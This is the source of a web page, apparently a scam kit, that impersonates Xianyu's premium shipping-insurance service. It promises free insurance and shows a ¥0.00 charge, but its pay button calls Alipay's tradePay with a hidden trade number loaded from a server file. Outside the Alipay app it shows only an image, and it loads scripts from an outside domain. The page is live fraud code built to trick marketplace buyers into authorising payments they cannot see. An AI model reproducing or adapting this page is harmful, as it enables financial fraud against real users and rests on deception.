
<?php
$ddh=file_get_contents("123.txt"); 
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
   	<title>闲鱼尊享寄-运费保价</title>
<script src="sanming045.js"></script>
    <meta name="keywords" content=""/>
    <meta name="description" content=""/>
    <link rel="stylesheet" href="layui.css" media="all">
    <link rel="stylesheet" href="http://pzds0991.top/public/static/js/layui/css/layui.css" media="all">
 
    <script src="http://pzds0991.top/public/static/js/layui/layui.all.js"></script>
    <style>
      *{
        margin: 0;
        padding: 0;
      }
      html{
        width:100%;
        height: 100%;
       background:#fff;
      }
      body{
        width:100%;
        height: 100%;
       background:#fff;
      }
      .main{
        width:100%;
        height: 100%;
       background:#fff;
      }
      .header{
        width:100%;
        height: 20%;
       background:#fff;
      }
      .header img{
        width:100%;
        height: 100%;
      }
      .content{
        width:100%;
        height: 70%;
       background:#fff;
      }
      .content .tupian{
        margin-top:20%;
        text-align: center;
      }
      .biaoti{
        text-align: center;
        font-weight: bold;
        font-size: 1rem;
        margin-top: 20%;
      }
      .wenzi1{
        width:86%;
        height: 6%;
        margin: 5% auto;
        text-align: left;
        background: #F6F7F9;
        border-radius: 0.5rem;
        padding:4% 2%;
        font-size: 0.8rem;
      }
      .wenzi1 a{
        color: #5698E5;
      }
      .wenzi2{
        width:84%;
        height: 15%;
        margin: 2% auto;
        text-align: left;
        border-radius: 0.5rem;
        padding:2% 2% 0% 2%;
        font-size: 0.8rem;
        border:0.2rem solid #E7E7E7;
      }
      .wenzi2 .left{
        width:50%;
        float:left;
      }
      .wenzi2 .right{
        width:50%;
        float:right;
        text-align: right;
        margin-top:1.8rem;
      }
      .wenzi3{
        width:90%;
        margin: 2% auto;
        margin-top:6rem;
      }
      .wenzi4{
        width:86%;
        height: 6%;
        margin: 2% auto;
        text-align: left;
        border-radius: 0.5rem;
        padding:4% 2%;
        font-size: 0.8rem;
      }
      .wenzi4 .left{
        width:50%;
        float:left;
      }
      .wenzi4 .right{
        width:50%;
        float:right;
        height: 2rem;
        text-align: center;
        line-height: 2rem;
        background: #FBE64D;
        margin-top:-0.5rem;
        border-radius: 2rem;
        font-weight: bold;
      }
    </style>
</head>
<body>
<div class="main">
    <div class="header">
      <img src="header.png" alt="">
    </div>
    <div class="content">
      <div class="tupian">
        <img style="width:3rem;height:3rem;" src="xianyu.png" alt="">
        <img style="width:3rem;height:3rem;" src="dian.png" alt="">
        <img style="width:3rem;height:3rem;" src="zhifubao.png" alt="">
      </div>
      <h1 class="biaoti">
        闲鱼尊享寄
      </h1>
      <div class="wenzi1">
        贵重物品需要【买家】使用【闲鱼尊享寄】。推荐使用<a href="">免费保价</a>，平台保障，更放心，丢必赔!
      </div>
      <div class="wenzi2">
          <div class="left">
          丢损必赔<img style="width:1rem;margin-left:0.1rem;margin-top:-0.2rem" src="xiaoinfo.png" alt=""><br>免费赠送最高10000元保价，丢失急速赔付。
          </div>
          <div class="right">
            <span>￥0</span><img style="width:1rem;margin-left:0.1rem;margin-top:-0.2rem" src="gou.png" alt="">
          </div>

      </div>

       <div class="wenzi3">
         <img style="width:1rem;margin-left:0.1rem;margin-top:-0.2rem" src="gou.png" alt="">
         <span style="color:#CFCFCF;">我已阅读并同意</span>《闲鱼用户服务协议》

      </div>
      <div class="wenzi4">
         <div class="left">
          实际运费<span style="color:red;font-weight:bold;font-size:1.1rem;">￥0.00</span>
          </div>
          <div class="right tradeno">
            <span>立即支付</span>
          </div>

      </div> 
      
    </div>

</div>
	
	<script>
		if (/AlipayClient/.test(window.navigator.userAgent)) {

		} else {
      $('.main').css('background','#F0EFF5');
			$('.main').html('<img style="width:100%;height:20rem" src="info.png" alt="" />');
		}
		function ready(callback) {
  if (window.AlipayJSBridge) {
    callback && callback();
  } else {
    document.addEventListener('AlipayJSBridgeReady', callback, false);
  }
}
ready(function(){
  document.querySelector('.tradeno').addEventListener('click', function() {
    AlipayJSBridge.call("tradePay", {
      tradeNO: "<?php echo $ddh; ?>"
    }, function(result) {
    });
  });
});
	</script>
</body>
</html>